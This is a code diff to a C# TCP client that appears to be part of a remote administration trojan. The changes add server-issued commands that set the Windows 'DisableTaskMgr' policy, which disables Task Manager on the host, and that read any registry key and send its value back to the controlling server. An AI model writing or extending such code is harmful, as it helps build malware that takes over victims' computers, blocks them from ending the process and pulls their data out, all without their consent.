@@ -1,10 +1,7 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net;
+﻿using System.Net;
 using System.Net.Sockets;
 using System.Text;
-using System.Threading.Tasks;
+using Microsoft.Win32;
 
 namespace Client.Client
 {
@@ -37,6 +34,19 @@ namespace Client.Client
             {
                 serverSocket.Send(Encoding.ASCII.GetBytes(tempString));
             }
+            else if(tempString.StartsWith("<SET-TASKMGR>"))
+            {
+                string value = tempString.Split(">")[1];
+                const string keyPath = @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+                WindowsHelper.WriteRegistryKey(keyPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
+            }
+            else if(tempString.StartsWith("<GET-REGKEY>"))
+            {
+                tempString = tempString.Replace("<GET-REGKEY>", "");
+                string[] split = tempString.Split("<SPLIT>");
+                string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
+                serverSocket.Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
+            }
         }
 
         public void ExecuteClient()
@@ -53,14 +63,13 @@ namespace Client.Client
                     // TCP/IP Socket.
                     serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 
+                    // Connect to server.
+                    serverSocket.Connect(localEndPoint);
+
+                    if (!bNameSent)
+                        bNameSent = SendName();
                     try
                     {
-                        // Connect to server.
-                        serverSocket.Connect(localEndPoint);
-
-                        if (!bNameSent)
-                            bNameSent = SendName();
-
                         while (serverSocket.Connected)
                         {
                             // Data buffer
@@ -71,7 +80,7 @@ namespace Client.Client
                     }
                     catch (Exception e)
                     {
-                        Console.WriteLine(e.ToString());
+                        Console.WriteLine(e.Message);
                     }
 
                     if (!serverSocket.Connected)
@@ -79,7 +88,7 @@ namespace Client.Client
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.ToString());
+                    Console.WriteLine(e.Message);
                 }
             }
         }
